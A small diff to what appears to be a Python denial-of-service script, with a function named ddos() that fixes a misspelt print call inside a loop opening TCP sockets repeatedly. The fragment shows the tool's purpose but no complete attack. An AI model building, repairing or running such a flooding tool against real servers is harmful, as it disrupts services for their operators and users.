@@ -30,7 +30,7 @@ def ddos():
    
    print("\033[1;32;40mGenerating...")
    message = (messages * rtxt)
-   primt("\033[1;32;40mOk!")
+   print("\033[1;32;40mOk!")
    while True:
       mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       try:
